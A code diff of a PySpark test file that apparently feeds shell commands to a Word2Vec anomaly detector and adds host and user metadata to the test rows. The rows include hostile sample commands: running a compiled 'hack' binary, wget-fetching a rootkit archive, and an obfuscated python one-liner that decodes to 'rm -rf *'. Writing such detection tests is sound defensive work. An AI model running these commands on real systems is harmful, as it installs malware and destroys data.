@@ -47,11 +47,11 @@ test1 = ctx.createDataFrame([
 ], ["command"])
 
 test2 = ctx.createDataFrame([
-  ("gcc hack.c -o hack;./hack".split(" "),),
-  ("wget http://wwww.my.com/rootkit.gz".split(" "), ),
-  ("echo, $?".split(" "),"2015-12-07","root", ),
-  ("asdjgiuarsjhgiurewhgjui asdadfsadf sdf".split(" "), ),
-  ("python -c 'import os; os.system(''.join([chr(ord(i)-1) for i in 'sn!.sg!+']))'".split(" "),)
+  ("gcc hack.c -o hack;./hack".split(" "),"2015-12-07","root","msr-telemetry-cass06","msr-dev-nsw-o01","sn-discovery-unix",),
+  ("wget http://wwww.my.com/rootkit.gz".split(" "),"2015-12-07","root","msr-telemetry-cass06","msr-dev-nsw","sn-discovery-unix", ),
+  ("echo, $?".split(" "),"2015-12-07","root","msr-telemetry-cass06","msr-dev-nsw-o01.domain.org","sn-discovery-unix", ),
+  ("asdjgiuarsjhgiurewhgjui asdadfsadf sdf".split(" "),"2015-12-07","root","msr-telemetry-cass06","","sn-discovery-unix", ),
+  ("python -c 'import os; os.system(''.join([chr(ord(i)-1) for i in 'sn!.sg!+']))'".split(" "),"2015-12-07","root","msr-telemetry-cass06","msr-dev-nsw-o01.domain.org","sn-discovery-unix", )
 ], ["command","date","exec_as","source","srcip","username"])
 
 # Convert new commands to vectors using W2V model
